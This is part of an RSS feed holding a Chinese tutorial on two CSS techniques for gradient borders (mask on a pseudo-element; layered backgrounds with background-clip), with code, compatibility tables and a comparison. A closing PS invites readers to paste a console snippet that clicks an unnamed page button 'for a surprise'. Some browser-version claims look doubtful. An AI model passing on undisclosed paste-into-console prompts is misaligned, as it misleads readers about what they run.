</ol>
<p>掌握 Colly，可以让你在 Go 项目中快速构建高性能爬虫服务。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS渐变色边框的两种实现方案原理+对比与实战]]></title>    <link>https://juejin.cn/post/7576273949179068479</link>    <guid>https://juejin.cn/post/7576273949179068479</guid>    <pubDate>2025-11-25T00:16:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576273949179068479" data-draft-id="7569898158836416553" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS渐变色边框的两种实现方案原理+对比与实战"/> <meta itemprop="keywords" content="前端,JavaScript,CSS"/> <meta itemprop="datePublished" content="2025-11-25T00:16:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹏多多"/> <meta itemprop="url" content="https://juejin.cn/user/747323639737191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS渐变色边框的两种实现方案原理+对比与实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323639737191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹏多多
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:16:54.000Z" title="Tue Nov 25 2025 00:16:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><p>在现代 Web 开发中，渐变色边框是提升 UI 视觉层次感的常用设计元素。不同于纯色边框的简单实现，渐变色边框需要借助 CSS 背景、伪元素等特性完成。本文将详细解析两种主流实现方案的原理、代码细节，并补充兼容性说明与使用场景对比。</p>
<h2 data-id="heading-0">1. 方案一：伪元素 + mask 实现</h2>
<p>使用伪元素 + mask 实现，灵活可控：</p>
<h3 data-id="heading-1">核心原理</h3>
<p>通过父元素的伪元素（::before）创建全屏覆盖层，利用 <code>padding</code> 控制边框厚度，再通过 <code>mask</code>（遮罩）特性实现「中间透明、边缘显示渐变」的效果。核心逻辑如下：</p>
<ol>
<li>伪元素 <code>inset: 0</code> 实现全屏覆盖父元素；</li>
<li><code>padding: Npx</code> 预留边框厚度（N 为边框宽度）；</li>
<li>渐变背景作为伪元素底色；</li>
<li><code>mask-composite</code> 实现遮罩叠加，只保留边缘区域显示。</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebe6a6fc84994bffa5d5ae20eaa8c631~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP5aSa5aSa:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634614&amp;x-signature=swPa0bISkQLMdmlM5a4%2B3pSyrGk%3D" alt="方案1" loading="lazy"/></p>
<h3 data-id="heading-2">完整代码</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"gradient-border-1"</span>&gt;</span>按钮1内容<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.gradient-border-1</span> {
  <span class="hljs-attribute">position</span>: relative; <span class="hljs-comment">/* 关键：伪元素绝对定位的参考 */</span>
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>; <span class="hljs-comment">/* 支持圆角 */</span>
  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* 可选：防止内容溢出边框 */</span>
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">50px</span>;
  <span class="hljs-comment">/* 内容区域样式（与边框无关） */</span>
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333333</span>;
}

<span class="hljs-comment">/* 伪元素实现渐变边框 */</span>
<span class="hljs-selector-class">.gradient-border-1</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>; <span class="hljs-comment">/* 伪元素必须有 content 才会显示 */</span>
  <span class="hljs-attribute">position</span>: absolute;
  inset: <span class="hljs-number">0</span>; <span class="hljs-comment">/* 等价于 top/right/bottom/left: 0 */</span>
  <span class="hljs-attribute">border-radius</span>: inherit; <span class="hljs-comment">/* 继承父元素圆角，避免边框直角 */</span>
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">3px</span>; <span class="hljs-comment">/* 边框厚度：3px */</span>
  <span class="hljs-comment">/* 渐变背景（可自定义方向和颜色） */</span>
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#9130fc</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#ff32e5</span> <span class="hljs-number">50%</span>, <span class="hljs-number">#ffe485</span> <span class="hljs-number">100%</span>);
  <span class="hljs-comment">/* 遮罩：保留边缘边框，中间内容区域透明 */</span>
  -webkit-<span class="hljs-attribute">mask</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">#fff</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>) content-box, <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">#fff</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>);
  -webkit-<span class="hljs-attribute">mask-composite</span>: xor; <span class="hljs-comment">/* 遮罩叠加模式：异或 */</span>
  <span class="hljs-attribute">mask-composite</span>: exclude; <span class="hljs-comment">/* 标准语法：排除中间区域 */</span>
  <span class="hljs-attribute">pointer-events</span>: none; <span class="hljs-comment">/* 关键：避免伪元素阻挡父元素的鼠标事件（如点击） */</span>
  <span class="hljs-attribute">transition</span>: ease <span class="hljs-number">0.3s</span>; <span class="hljs-comment">/* 过渡动画 */</span>
}

<span class="hljs-comment">/* hover 动效：切换渐变颜色 */</span>
<span class="hljs-selector-class">.gradient-border-1</span><span class="hljs-selector-pseudo">:hover</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#ff3c00</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#ff7a00</span> <span class="hljs-number">50%</span>, <span class="hljs-number">#9130fc</span> <span class="hljs-number">100%</span>);
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">关键特性说明</h3>
<ol>
<li><strong>边框厚度控制</strong>：通过 <code>padding</code> 直接调整（如 <code>padding: 2px</code> 对应 2px 边框）；</li>
<li><strong>圆角支持</strong>：<code>border-radius: inherit</code> 确保边框与父元素圆角一致，无锯齿；</li>
<li><strong>事件穿透</strong>：<code>pointer-events: none</code> 保证父元素的点击、hover 等事件正常触发；</li>
<li><strong>动效支持</strong>：直接修改伪元素的 <code>background</code> 渐变即可实现边框颜色过渡。</li>
</ol>
<h2 data-id="heading-4">2. 方案二：双层背景 + background-clip 实现（简洁高效）</h2>
<p>双层背景 + background-clip 实现（简洁高效）：</p>
<h3 data-id="heading-5">核心原理</h3>
<p>利用 CSS 多背景图层叠加特性，同时设置两个背景：</p>
<ol>
<li>内层背景：纯色背景（与页面背景一致，模拟「内容区域透明」效果）；</li>
<li>外层背景：渐变背景（作为边框颜色）；
通过 <code>background-clip</code> 和 <code>background-origin</code> 控制两个背景的显示范围：</li>
</ol>
<ul>
<li><code>padding-box</code>：内层背景仅显示在 padding 区域（内容区域）；</li>
<li><code>border-box</code>：外层背景显示在边框区域；</li>
<li>父元素设置 <code>border: Npx solid transparent</code>，让边框区域显示外层渐变背景。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03c05840721c4d6794d27748a79e37a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP5aSa5aSa:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634614&amp;x-signature=UkNDvop%2FEHRBHMt4xU5uhnXLubI%3D" alt="方案2" loading="lazy"/></p>
<h3 data-id="heading-6">完整代码</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"gradient-border-2"</span>&gt;</span>按钮2内容<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.gradient-border-2</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">50px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>; <span class="hljs-comment">/* 支持圆角 */</span>
  <span class="hljs-comment">/* 关键：透明边框 + 双层背景 */</span>
  <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid transparent;
  <span class="hljs-attribute">background</span>: 
    <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">#f1f1f1</span>, <span class="hljs-number">#f1f1f1</span>) padding-box, <span class="hljs-comment">/* 内层：内容区域背景 */</span>
    <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#9130fc</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#ff32e5</span> <span class="hljs-number">50%</span>, <span class="hljs-number">#ffe485</span> <span class="hljs-number">100%</span>) border-box; <span class="hljs-comment">/* 外层：边框渐变 */</span>
  <span class="hljs-attribute">background-origin</span>: padding-box, border-box; <span class="hljs-comment">/* 背景起始位置：分别对应 padding 和 border */</span>
  <span class="hljs-attribute">background-clip</span>: padding-box, border-box; <span class="hljs-comment">/* 背景裁剪：仅显示在对应区域 */</span>
  <span class="hljs-comment">/* 内容区域样式 */</span>
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333333</span>;
  <span class="hljs-attribute">transition</span>: ease <span class="hljs-number">0.3s</span>; <span class="hljs-comment">/* 过渡动画 */</span>
}

<span class="hljs-comment">/* hover 动效：切换外层渐变背景 */</span>
<span class="hljs-selector-class">.gradient-border-2</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">background</span>: 
    <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">#f1f1f1</span>, <span class="hljs-number">#f1f1f1</span>) padding-box, <span class="hljs-comment">/* 内层背景不变 */</span>
    <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#ff3c00</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#ff7a00</span> <span class="hljs-number">50%</span>, <span class="hljs-number">#9130fc</span> <span class="hljs-number">100%</span>) border-box; <span class="hljs-comment">/* 外层渐变切换 */</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">关键特性说明</h3>
<ol>
<li><strong>简洁性</strong>：无需伪元素，仅通过父元素的背景和边框属性实现；</li>
<li><strong>边框厚度控制</strong>：直接修改 <code>border</code> 的宽度（如 <code>border: 4px solid transparent</code>）；</li>
<li><strong>背景联动</strong>：内层背景需与页面背景一致（示例中为 <code>#f1f1f1</code>），否则会露出内层背景色；</li>
<li><strong>无事件冲突</strong>：无需额外处理鼠标事件，天然支持父元素交互。</li>
</ol>
<h2 data-id="heading-8">3. 兼容性对比</h2>
<h3 data-id="heading-9">方案一（伪元素 + mask）</h3>






























<table><thead><tr><th>特性</th><th>支持浏览器版本</th><th>备注</th></tr></thead><tbody><tr><td><code>mask</code> / <code>-webkit-mask</code></td><td>Chrome 4+、Firefox 53+、Safari 6+、Edge 79+</td><td>需添加 <code>-webkit-</code> 前缀</td></tr><tr><td><code>mask-composite</code></td><td>Chrome 4+、Firefox 53+、Safari 6+、Edge 79+</td><td>标准语法 <code>exclude</code> 需配合前缀</td></tr><tr><td>圆角支持</td><td>所有现代浏览器</td><td>无兼容性问题</td></tr><tr><td>过渡动画</td><td>所有现代浏览器</td><td>支持渐变背景过渡</td></tr></tbody></table>
<p><strong>兼容性结论</strong>：支持所有现代浏览器，IE 完全不支持（<code>mask</code> 特性未实现）。适合面向移动端、PC 端现代浏览器的场景。</p>
<h3 data-id="heading-10">方案二（双层背景 + background-clip）</h3>






























<table><thead><tr><th>特性</th><th>支持浏览器版本</th><th>备注</th></tr></thead><tbody><tr><td><code>background-clip</code></td><td>Chrome 1+、Firefox 4+、Safari 3.1+、Edge 12+、IE 9+</td><td>部分旧浏览器需前缀 <code>-webkit-</code></td></tr><tr><td><code>background-origin</code></td><td>Chrome 1+、Firefox 4+、Safari 3.1+、Edge 12+、IE 9+</td><td>无明显兼容性问题</td></tr><tr><td>多背景叠加</td><td>Chrome 1+、Firefox 3.6+、Safari 3.1+、Edge 12+、IE 9+</td><td>支持多层背景叠加</td></tr><tr><td>圆角支持</td><td>所有现代浏览器</td><td>无兼容性问题</td></tr></tbody></table>
<p><strong>兼容性结论</strong>：兼容性更优，支持 IE 9+ 及所有现代浏览器。适合需要兼容旧版浏览器（如 IE 11）的场景。</p>
<h2 data-id="heading-11">4. 两种方案对比与使用场景</h2>



































<table><thead><tr><th>对比维度</th><th>方案一（伪元素 + mask）</th><th>方案二（双层背景）</th></tr></thead><tbody><tr><td>实现复杂度</td><td>中等（需理解 mask 遮罩原理）</td><td>简单（仅需掌握背景属性）</td></tr><tr><td>兼容性</td><td>现代浏览器友好（IE 不支持）</td><td>更广泛（支持 IE 9+）</td></tr><tr><td>内容背景依赖</td><td>无（伪元素独立，内容区域背景可自由设置）</td><td>有（内层背景需与页面背景一致）</td></tr><tr><td>边框效果灵活性</td><td>高（支持复杂遮罩，如渐变+透明度）</td><td>中等（仅支持渐变背景）</td></tr><tr><td>性能开销</td><td>略高（伪元素 + mask 计算）</td><td>更低（纯背景渲染，无额外元素）</td></tr></tbody></table>
<h3 data-id="heading-12">推荐使用场景</h3>
<ol>
<li>
<p><strong>方案一</strong>：</p>
<ul>
<li>需兼容现代浏览器（Chrome/Firefox/Safari/Edge）；</li>
<li>内容区域背景复杂（如图片背景、动态背景）；</li>
<li>需实现更灵活的边框效果（如渐变+半透明、多色叠加）。</li>
</ul>
</li>
<li>
<p><strong>方案二</strong>：</p>
<ul>
<li>需兼容旧版浏览器（如 IE 11）；</li>
<li>内容区域的背景色需要为纯色，且与页面背景一致；</li>
<li>追求简洁代码，无需额外伪元素。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-13">5. 进阶优化建议</h2>
<ol>
<li><strong>渐变方向自定义</strong>：将 <code>linear-gradient</code> 改为 <code>radial-gradient</code>（径向渐变）或 <code>conic-gradient</code>（锥形渐变），实现更多样的边框效果；</li>
<li><strong>响应式边框</strong>：使用相对单位（如 <code>em</code>、<code>vw</code>）替代固定像素，适配不同屏幕尺寸；</li>
<li><strong>性能优化</strong>：方案一中可添加 <code>will-change: background</code> 提升过渡动画性能；</li>
<li><strong>兼容性前缀</strong>：使用 Autoprefixer 自动添加浏览器前缀（如 <code>-webkit-mask</code>、<code>-webkit-background-clip</code>），减少手动编写成本。</li>
</ol>
<h2 data-id="heading-14">6. 总结</h2>
<p>两种方案均能实现高质量的渐变色边框，核心差异在于兼容性和使用场景。方案一通过伪元素+mask 提供更高的灵活性，适合现代浏览器环境；方案二通过双层背景实现更简洁的代码和更广泛的兼容性，适合需要兼容旧版浏览器的场景。实际开发中可根据项目的浏览器支持范围、内容背景复杂度选择合适的方案，同时结合进阶优化技巧提升视觉效果和性能。</p>
<hr/>
<blockquote>
<p>本次分享就到这儿啦，我是鹏多多，深耕前端的技术创作者，如果您看了觉得有帮助，欢迎评论，关注，点赞，转发，我们下次见~</p>
</blockquote>
<p>PS：在本页按F12，在console中输入document.getElementsByClassName('panel-btn')[0].click();有惊喜哦~</p>
<p><code>往期文章</code></p>
<ul>
<li><a href="https://juejin.cn/post/7568192652286754870" target="_blank" title="https://juejin.cn/post/7568192652286754870">纯前端提取图片颜色插件Color-Thief教学+实战完整指南</a></li>
<li><a href="https://juejin.cn/post/7565737512816771135" target="_blank" title="https://juejin.cn/post/7565737512816771135">react-konva实战指南：Canvas高性能+易维护的组件化图形开发实现教程</a></li>
<li><a href="https://juejin.cn/post/7560905838074462271" target="_blank" title="https://juejin.cn/post/7560905838074462271">React无限滚动插件react-infinite-scroll-component的配置+优化+避坑指南</a></li>
<li><a href="https://juejin.cn/post/7560542615484137491" target="_blank" title="https://juejin.cn/post/7560542615484137491">前端音频兼容解决：音频神器howler.js从基础到进阶完整使用指南</a></li>
